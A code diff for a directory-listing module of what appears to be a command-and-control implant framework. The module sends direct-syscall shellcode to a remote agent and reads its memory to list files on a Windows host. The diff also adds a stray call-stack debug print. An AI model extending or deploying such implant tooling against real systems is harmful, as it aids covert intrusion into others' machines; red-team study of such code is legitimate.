@@ -1,7 +1,7 @@
 NAME = "dir"
 DESCRIPTION = "Enumerate files in a directory. If no path is provided, it uses the agent's current working directory."
 PARAMS = [
-    {"name":"directory_path", "description":"Optional: Complete path (e.g. C:\\Windows)", "type":"str", "optional": True, "default": ""}
+    {"name":"directory_path", "description":"Optional: Complete path (e.g. C:\\Windows)", "type":"str", "optional": True, "default": ""},
 ]
 
 DEPENDENCIES = [
@@ -10,42 +10,9 @@ DEPENDENCIES = [
     "NtQueryDirectoryFile", 
     "NtClose", 
     "NtFreeVirtualMemory",
-    "NtQueryInformationProcess",
-    "NtReadVirtualMemory"
+    "NtReadVirtualMemory",
+    "pwd"
 ]
-
-def get_current_directory(agent_id):
-    """Helper to read the current directory from the PEB -> ProcessParameters."""
-    from services.orders import send_and_wait, read_scratchpad, read_from_agent
-    from models.syscall import Syscall
-    from models.agent import Agent
-    import struct
-
-    agent = Agent.by_id(agent_id)
-    # 1. Get PEB via NtQueryInformationProcess
-    syscall = Syscall.sys(agent.id, "NtQueryInformationProcess")
-    params = [0xFFFFFFFFFFFFFFFF, 0, agent.scratchpad, 48, 0] 
-    from services.binary import push_syscall
-    shellcode = push_syscall(syscall, params, agent.debug)
-    send_and_wait(agent_id, shellcode)
-    
-    struct_data = read_scratchpad(agent_id, 48)
-    peb_addr = struct.unpack_from("<Q", struct_data, 8)[0]
-
-    # 2. PEB + 0x20 -> ProcessParameters
-    proc_params_ptr_raw = read_from_agent(agent_id, peb_addr + 0x20, 8)[:8]
-    #printproc_params_ptr_raw)
-    proc_params_addr = struct.unpack("<Q", proc_params_ptr_raw)[0]
-
-    # 3. ProcessParameters + 0x38 -> CurrentDirectory (UNICODE_STRING)
-    # UNICODE_STRING: [Length(2)][MaxLength(2)][Pad(4)][BufferPtr(8)]
-    cur_dir_struct = read_from_agent(agent_id, proc_params_addr + 0x38, 16)
-    length = struct.unpack("<H", cur_dir_struct[0:2])[0]
-    buffer_ptr = struct.unpack("<Q", cur_dir_struct[8:16])[0]
-
-    # 4. Read the actual string
-    raw_name = read_from_agent(agent_id, buffer_ptr, length)
-    return raw_name.decode("utf-16le", errors="ignore")
 
 # ... (parse_file_both_dir_information, filetime_to_dt, format_dir_entry, build_dir_output same as before) ...
 def filetime_to_dt(filetime):
@@ -117,7 +84,6 @@ def parse_file_both_dir_information(buf: bytes):
             short_name = short_name_raw[:short_name_length].decode("utf-16le", errors="ignore")
         except:
             short_name = ""
-
         # 0x5E: (Padding/Reserved - 2 bytes usually)
         # 0x60: FileName (WCHAR[1]) - Variable length starts here (Offset 94)
         file_name_offset = offset + 94
@@ -130,7 +96,8 @@ def parse_file_both_dir_information(buf: bytes):
             file_name = buf[file_name_offset:file_name_end].decode("utf-16le", errors="ignore")
         except:
             file_name = "Unknown"
-
+        if file_name[-1] == "\x00":
+            file_name = file_name[:-1]
         entries.append({
             "next_entry_offset": next_entry_offset,
             "file_index": file_index,
@@ -186,7 +153,8 @@ def function(agent_id, args):
     # Check if directory_path was provided and is not empty
     if not args or args[0] == "":
         #print"[*] No path provided. Resolving current directory from PEB...")
-        dir_path = get_current_directory(agent_id)
+        dir_path = pwd(agent_id, [])
+        dir_path = dir_path["pwd"]
     else:
         dir_path = args[0]
     
@@ -214,16 +182,16 @@ def function(agent_id, args):
             query_ret = NtQueryDirectoryFile(agent_id, [dir_handle, target_buf_ptr, buf_size])
             
             if query_ret["retval"] == 0:
+                import inspect
                 data = read_from_agent(agent_id, target_buf_ptr, buf_size)
                 entries = parse_file_both_dir_information(data)
                 formatted_output = "\n Directory of " + dir_path + "\n\n" + build_dir_output(entries)
-                #printformatted_output)
-
-                results = {
-                    "Result": "Success",
-                    "Path": dir_path,
-                    "file_data": formatted_output
-                }
+                print(f"caller = {inspect.stack()[1].function} from {inspect.stack()[2].function} from {inspect.stack()[3].function} ")
+                if inspect.stack()[3].function == "_shell_ws_agent":
+                    results = formatted_output
+                else:
+                    results = entries
+                    results = {"retval":0, "results":entries}
 
                 NtClose(agent_id, [dir_handle])
                 NtFreeVirtualMemory(agent_id, [target_buf_ptr, buf_size])
@@ -231,9 +199,9 @@ def function(agent_id, args):
             else:
                 NtClose(agent_id, [dir_handle])
                 NtFreeVirtualMemory(agent_id, [target_buf_ptr, 0])
-                return {"Result": f"Error in NtQueryDirectoryFile: {hex(query_ret['retval'])}"}
+                return {"retval": -1, "message":f"Error in NtQueryDirectoryFile: {hex(query_ret['retval'])}"}
         else:
             NtFreeVirtualMemory(agent_id, [target_buf_ptr, 0])
-            return {"Result": f"Error in NtOpenFile: {hex(open_ret['retval'])}"}
+            return {"retval": -1, "message":f"Error in NtOpenFile: {hex(open_ret['retval'])}"}
     else:
-        return {"Result": f"Error in NtAllocateVirtualMemory: {hex(alloc_ret['retval'])}"}
+        return {"retval": -1, "message":f"Error in NtAllocateVirtualMemory: {hex(alloc_ret['retval'])}"}
